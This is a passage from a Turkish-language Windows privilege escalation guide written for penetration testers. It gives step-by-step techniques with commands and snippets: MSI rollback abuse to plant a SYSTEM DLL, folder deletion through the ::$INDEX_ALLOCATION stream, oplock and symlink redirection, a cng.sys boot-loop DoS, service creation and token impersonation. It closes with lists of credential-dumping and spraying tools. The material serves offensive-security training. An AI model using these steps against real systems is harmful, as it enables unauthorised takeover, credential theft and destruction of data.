    - `.msi`, şu işlemleri yapan bir **özel install action (`SyncBeforeRollback`)** içerir:
        - `.rbs` oluşturulduğunda bir event’e sinyal gönderir.
        - Ardından devam etmeden önce **bekler**.

- Adım 10: Zayıf ACL’leri yeniden uygulayın
    - `.rbs created` event’ini aldıktan sonra:
        - Windows Installer, `C:\Config.Msi` dizinine **güçlü ACL’leri yeniden uygular**.
        - Ancak hâlâ `WRITE_DAC` iznine sahip bir handle’ınız olduğundan, **zayıf ACL’leri yeniden uygulayabilirsiniz**.

> ACL’ler **yalnızca handle açılırken denetlenir**; bu nedenle klasöre yazmaya devam edebilirsiniz.

- Adım 11: Sahte `.rbs` ve `.rbf` dosyalarını yerleştirin
    - `.rbs` dosyasının üzerine, Windows’a şunu yaptıran **sahte bir rollback script’i** yazın:
        - `.rbf` dosyanızı (kötü amaçlı DLL) **ayrıcalıklı bir konuma** (ör. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`) geri yüklemesini.
    - **SYSTEM düzeyinde kötü amaçlı payload DLL** içeren sahte `.rbf` dosyanızı yerleştirin.

- Adım 12: Rollback’i tetikleyin
    - Installer’ın devam etmesi için senkronizasyon event’ine sinyal gönderin.
    - Yüklemeyi bilinen bir noktada **kasten başarısız kılmak** üzere bir **type 19 custom action (`ErrorOut`)** yapılandırılmıştır.
    - Bu, **rollback’in başlamasına** neden olur.

- Adım 13: SYSTEM DLL’inizi yükler
    - Windows Installer:
        - Kötü amaçlı `.rbs` dosyanızı okur.
        - `.rbf` DLL’inizi hedef konuma kopyalar.
    - Artık **SYSTEM tarafından yüklenen bir path’te** kötü amaçlı DLL’iniz vardır.

- Son adım: SYSTEM kodunu çalıştırın
    - Hijack ettiğiniz DLL’i yükleyen, güvenilir ve **auto-elevated** bir binary’yi (ör. `osk.exe`) çalıştırın.
    - **Bitti**: Kodunuz **SYSTEM olarak** çalıştırılır.


### Rastgele Dosya Silme/Taşıma/Yeniden Adlandırma Açığından SYSTEM EoP’ye

Ana MSI rollback tekniği (bir önceki teknik), **tüm bir klasörü** (ör. `C:\Config.Msi`) silebildiğinizi varsayar. Peki açığınız yalnızca **rastgele dosya silmeye** izin veriyorsa?

**NTFS dahili yapısından** yararlanabilirsiniz: her klasörün şu adlı gizli bir alternate data stream’i vardır:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Bu akış, klasörün **dizin meta verilerini** depolar.

Dolayısıyla, bir klasörün **`::$INDEX_ALLOCATION` akışını silerseniz**, NTFS klasörün tamamını dosya sisteminden **kaldırır**.

Bunu şu gibi standart dosya silme API'lerini kullanarak yapabilirsiniz:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Bir *file* delete API çağırıyor olsanız bile, **klasörün kendisini siler**.

### Klasör İçeriğini Silmeden SYSTEM EoP'ye
Primitive'iniz rastgele dosyaları/klasörleri silmenize izin vermiyor, ancak saldırganın kontrolündeki bir klasörün *içeriğini* silmenize **izin veriyorsa** ne olur?

1. Step 1: Bir yem klasörü ve dosyası oluşturun
- Oluşturun: `C:\temp\folder1`
- İçine şunu ekleyin: `C:\temp\folder1\file1.txt`

2. Step 2: `file1.txt` üzerinde bir **oplock** ayarlayın
- Privileged bir process `file1.txt` dosyasını silmeye çalıştığında oplock **yürütmeyi duraklatır**.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Adım 3: SYSTEM sürecini tetikle (ör. `SilentCleanup`)
- Bu süreç klasörleri (ör. `%TEMP%`) tarar ve içeriklerini silmeye çalışır.
- `file1.txt` dosyasına ulaştığında **oplock tetiklenir** ve kontrolü callback'inize devreder.

4. Adım 4: Oplock callback içinde – silme işlemini yönlendir

- Seçenek A: `file1.txt` dosyasını başka bir yere taşı
    - Bu, oplock'i bozmadan `folder1` klasörünü boşaltır.
    - `file1.txt` dosyasını doğrudan silmeyin — bu, oplock'in vaktinden önce serbest bırakılmasına neden olur.

- Seçenek B: `folder1` klasörünü bir **junction**'a dönüştür:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Seçenek C: `\RPC Control` içinde bir **symlink** oluşturun:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Bu, klasör meta verilerini depolayan NTFS dahili akışını hedefler — bunu silmek klasörü siler.

5. Step 5: Oplock'u bırakın
- SYSTEM işlemi devam eder ve `file1.txt` dosyasını silmeye çalışır.
- Ancak şimdi, junction + symlink nedeniyle, aslında şunu silmektedir:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Sonuç**: `C:\Config.Msi`, SYSTEM tarafından silinir.

### Rastgele Klasör Oluşturmadan Kalıcı DoS’a

**SYSTEM/admin olarak rastgele bir klasör oluşturmanıza** olanak tanıyan bir primitive’i exploit edin — **dosya yazamasanız** veya **zayıf izinler ayarlayamasanız** bile.

**Kritik bir Windows driver’ının** adıyla bir **klasör** (dosya değil) oluşturun. Örneğin:
```
C:\Windows\System32\cng.sys
```

- Bu yol normalde `cng.sys` kernel-mode driver'ına karşılık gelir.
- **Önceden bir klasör olarak oluşturursanız**, Windows açılışta gerçek driver'ı yükleyemez.
- Ardından Windows, açılış sırasında `cng.sys` dosyasını yüklemeye çalışır.
- Klasörü görür, **gerçek driver'ı çözümlenemediği için bulamaz** ve **çöker veya açılışı durdurur**.
- Harici müdahale (ör. açılış onarımı veya diske erişim) olmadan **yedek bir seçenek** ve **kurtarma olanağı yoktur**.

### Ayrıcalıklı log/yedekleme yollarından ve OM symlinks'ten rastgele dosya üzerine yazmaya / açılış DoS'una

Bir **ayrıcalıklı service**, **yazılabilir bir config** dosyasından okunan bir yola log/export yazdığında, bu yolu **Object Manager symlinks + NTFS mount points** ile yönlendirerek ayrıcalıklı yazma işlemini rastgele bir dosyanın üzerine yazmaya dönüştürün (SeCreateSymbolicLinkPrivilege olmadan bile).<sup>[[15]](#references)</sup>

**Gereksinimler**
- Hedef yolu tutan config dosyasının saldırgan tarafından yazılabilir olması (ör. `%ProgramData%\...\.ini`).
- `\RPC Control` konumuna bir mount point ve bir OM file symlink oluşturabilme (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Bu yola yazma yapan ayrıcalıklı bir işlem (log, export, rapor).

**Örnek zincir**
1. Ayrıcalıklı log hedefini bulmak için config dosyasını okuyun. Örneğin, `C:\ProgramData\ICONICS\IcoSetup64.ini` dosyasındaki `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt`.
2. Admin olmadan yolu yönlendirin:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Ayrıcalıklı bileşenin logu yazmasını bekleyin (ör. yöneticinin “test SMS’i gönder” işlemini başlatması). Yazma işlemi artık `C:\Windows\System32\cng.sys` konumuna yapılır.
4. Bozulmayı doğrulamak için üzerine yazılan hedefi inceleyin (hex/PE parser); yeniden başlatma, Windows’un değiştirilmiş driver yolunu yüklemesini zorlar → **boot loop DoS**. Bu yöntem, ayrıcalıklı bir service’in yazma amacıyla açacağı korumalı herhangi bir dosyaya da uygulanabilir.

> `cng.sys` normalde `C:\Windows\System32\drivers\cng.sys` konumundan yüklenir; ancak `C:\Windows\System32\cng.sys` konumunda bir kopyası varsa önce bu kopya denenebilir. Bu da bozuk veriler için güvenilir bir DoS hedefi oluşturur.



## **High Integrity'den SYSTEM'e**

### **Yeni service**

Zaten High Integrity düzeyinde bir process çalıştırıyorsanız, **SYSTEM'e giden yol** yeni bir service **oluşturup çalıştırmakla** kolay olabilir:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Bir service binary oluştururken bunun geçerli bir service olduğundan veya gerekli işlemleri hızlıca gerçekleştirdiğinden emin olun; geçerli bir service değilse 20 saniye içinde sonlandırılır.

### AlwaysInstallElevated

High Integrity process içinden **AlwaysInstallElevated registry girdilerini etkinleştirmeyi** ve bir _**.msi**_ wrapper kullanarak bir reverse shell **kurmayı** deneyebilirsiniz.\
[İlgili registry anahtarları ve _.msi_ paketinin nasıl kurulacağı hakkında daha fazla bilgi burada.](#alwaysinstallelevated)

### High + SeImpersonate privilege ile System'e

**Kodu** [**burada bulabilirsiniz**](seimpersonate-from-high-to-system.md)**.**

### SeDebug + SeImpersonate'ten Full Token privileges'a

Bu token privileges'a sahipseniz (muhtemelen bunu zaten High Integrity olan bir process'te bulursunuz), SeDebug privilege'ini kullanarak **neredeyse tüm process'leri** (korumalı process'ler hariç) **açabilir**, process'in **token'ını kopyalayabilir** ve bu token'la **istediğiniz bir process'i oluşturabilirsiniz**.\
Bu teknik genellikle **tüm token privileges'larına sahip SYSTEM olarak çalışan bir process seçmek** için kullanılır (_evet, tüm token privileges'larına sahip olmayan SYSTEM process'leri bulabilirsiniz_).\
**Önerilen tekniği uygulayan bir** [**kod örneğini burada bulabilirsiniz**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Bu teknik, `getsystem` içinde yükseltme yapmak için meterpreter tarafından kullanılır. Teknik, **bir pipe oluşturup ardından bu pipe'a yazması için bir service oluşturmayı/kötüye kullanmayı** içerir. Daha sonra, **`SeImpersonate`** privilege'ini kullanarak pipe'ı oluşturan **server**, pipe client'ının (service'in) token'ını **impersonate** edebilir ve SYSTEM privileges elde edebilir.\
[**Name pipe'lar hakkında daha fazla bilgi edinmek istiyorsanız bunu okuyun**](#named-pipe-client-impersonation).\
[**Name pipe kullanarak High Integrity'den System'e nasıl geçileceğine dair bir örnek okumak istiyorsanız bunu okuyun**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

**SYSTEM olarak çalışan** bir **process** tarafından **yüklenen** bir dll'yi **hijack** edebilirseniz, o process'in permissions'larıyla istediğiniz kodu çalıştırabilirsiniz. Bu nedenle Dll Hijacking bu tür bir privilege escalation için de kullanışlıdır. Ayrıca, dll'leri yüklemek için kullanılan klasörlerde **write permissions** olacağından, bunu **High Integrity process içinden gerçekleştirmek çok daha kolaydır**.\
**Dll hijacking hakkında daha fazla bilgiye** [**buradan ulaşabilirsiniz**](dll-hijacking/index.html)**.**

### **Administrator veya Network Service'ten System'e**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### LOCAL SERVICE veya NETWORK SERVICE'ten full privs'a

**Okuyun:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Daha fazla yardım

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Kullanışlı araçlar

**Windows local privilege escalation vektörlerini aramak için en iyi araç:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Misconfiguration'ları ve hassas dosyaları kontrol eder (**[**buradan kontrol edin**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Tespit edildi.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Olası misconfiguration'ları kontrol eder ve bilgi toplar (**[**buradan kontrol edin**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Misconfiguration'ları kontrol eder**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Kaydedilmiş PuTTY, WinSCP, SuperPuTTY, FileZilla ve RDP oturum bilgilerini çıkarır. Yerel kullanımda -Thorough seçeneğini kullanın.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager'dan credentials çıkarır. Tespit edildi.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Toplanan parolaları domain genelinde spray eder**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh, PowerShell tabanlı bir ADIDNS/LLMNR/mDNS spoofing ve man-in-the-middle aracıdır.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Temel Windows privesc enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Bilinen privesc zafiyetlerini arar (Watson nedeniyle KULLANIMDAN KALDIRILDI)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Yerel kontroller **(Admin hakları gerekir)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Bilinen privesc zafiyetlerini arar (VisualStudio kullanılarak derlenmesi gerekir) ([**önceden derlenmiş**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Misconfiguration'ları aramak için host üzerinde enumeration yapar (privesc aracından çok bilgi toplama aracıdır) (derlenmesi gerekir) **(**[**önceden derlenmiş**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Pek çok yazılımdan credentials çıkarır (github'da önceden derlenmiş exe bulunur)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp'ın C# diline port edilmiş sürümü**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Misconfiguration'ları kontrol eder (github'da önceden derlenmiş executable bulunur). Önerilmez. Win10'da iyi çalışmaz.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Olası misconfiguration'ları kontrol eder (python'dan exe). Önerilmez. Win10'da iyi çalışmaz.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Bu gönderiye dayanarak oluşturulmuş araç (düzgün çalışması için accesschk gerekmez, ancak kullanabilir).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** çıktısını okur ve çalışan exploit'leri önerir (yerel python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** çıktısını okur ve çalışan exploit'leri önerir (yerel Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Projeyi doğru .NET sürümünü kullanarak derlemeniz gerekir ([buna bakın](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Hedef host'ta yüklü .NET sürümünü görmek için şunu çalıştırabilirsiniz:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```





## References

- [1] [Windows Privilege Escalation Temelleri](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Zayıf klasör izinlerinden yararlanarak yetki yükseltme](http://www.greyhathacker.net/?p=738)
- [3] [Windows Privilege Escalation - bir başvuru kılavuzu](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Windows / Linux Local Privilege Escalation Atölyesi](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Windows Saldırıları: AT yeni siyah (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Privilege Escalation - Windows - Eksiksiz OSCP Rehberi](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - Privilege Escalation - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Windows Privilege Escalation Rehberi](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Windows-Privilege-Escalation kontrol listesi](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Pentester'lar için Windows Privilege Escalation Yöntemleri](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: SMTP üzerinden Word VBA macro phishing → hMailServer kimlik bilgilerini çözme → SYSTEM için Veeam CVE-2023-27532](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) ve kernel token hırsızlığı](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Silver Fox'un Peşinde: Kernel Gölgelerinde Kedi Fare Oyunu](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – Bir SCADA Sisteminde Bulunan Ayrıcalıklı Dosya Sistemi Güvenlik Açığı](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Symbolic Link Test Araçları – CreateSymlink kullanımı](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Geçmişe Bir Bağlantı. Windows'ta Symbolic Link'lerden Yararlanma](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (Cobalt Strike BOF portu)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js Trust Falls: Windows'ta Tehlikeli Modül Çözümleme](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.js modülleri: `node_modules` klasörlerinden yükleme](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - C/C++ kontrol listesi görevlerinin çözümleri](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - RtlQueryRegistryValues işlevi](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Microslop ile Pwn2Own: Windows LPE için CLDFLT ve DirectX Kernel Race Condition'larını zincirleme](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Hepsine Hükmedecek Tek I/O Ring: Windows 11'de Tam Okuma/Yazma Exploit Primitive'i](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Rastgele Dosya Silmelerinden Yararlanarak Yetki Yükseltme ve Diğer Harika Yöntemler](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - FilesystemEoPs exploit kodu](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – WSUS Saldırıları Bölüm 2: CVE-2020-1013, Windows 10'da bir Local Privilege Escalation 1-Day](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Credential Manager ve Windows Vault'u İnceleme](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Bir Görüntü Değişikliğinin Privilege Escalation'a Yol Açtığı Kerberos Resource Based Constrained Delegation](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Windows 10 Ssh Agent'tan Ssh Private Key'leri Çıkarma](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – Kurumsal Güncelleme Sunucularını Backdoor Fabrikalarına Dönüştürme (0_o) – Bölüm 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Kurumsal Güncelleme Sunucularını Backdoor Fabrikalarına Dönüştürme (0_o) – Bölüm 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence - Microsoft Windows Installer Klasörünü Silerek Privilege Escalation](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center - CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
- [43] [MDSec - Total Recall: NT AUTHORITY\SYSTEM'e Geri Dönüş Adımlarını İzleme](https://www.mdsec.co.uk/2026/02/total-recall-retracing-your-steps-back-to-nt-authoritysystem/)
- [44] [NCC Group - Windows MIDI Services paylaşılan bellek offset'leri privilege escalation danışma bildirimi](https://nccgroup.com/research/technical-advisory-microsoft-windows-midi-service-module-escalation-of-privileges-cve-2026-62688)
{{#include ../../banners/hacktricks-training.md}}
